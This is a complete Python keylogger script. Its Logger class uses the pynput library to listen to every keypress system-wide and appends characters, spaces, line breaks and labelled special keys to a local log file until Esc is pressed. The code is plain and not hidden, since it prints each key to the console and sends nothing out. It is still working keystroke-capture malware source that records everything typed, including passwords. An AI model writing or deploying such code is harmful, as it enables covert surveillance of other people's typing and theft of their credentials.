from pynput import keyboard
class Logger():

    def __init__(self):
        self.file = "log/log.txt"
        return

    def start(self):
        logger = keyboard.Listener(on_press=self.press)
        logger.start()
        logger.join()

    def press(self, key):
        with open(self.file, "a") as file:
            try:
                char = key.char
                if char.isdigit():
                    print(f"Digit Key: {key.char}")
                    file.write(key.char)
                elif char.isalpha():
                    print(f"Character Key: {key.char}")
                    file.write(key.char)
                elif not char.isalnum():
                    print(f"Special Characters: {key.char}")
                    file.write(key.char)

            except AttributeError:
                print(f"Special Key: {key}")
                if key == keyboard.Key.space:
                    file.write(" ")
                elif key == keyboard.Key.enter:
                    file.write("\n")
                else:
                    spec_key = str(key)
                    file.write("\n" + "Special Key: [" + spec_key + "]\n")
            if key == keyboard.Key.esc:
                file.close()
                print("Exiting...")
                return False

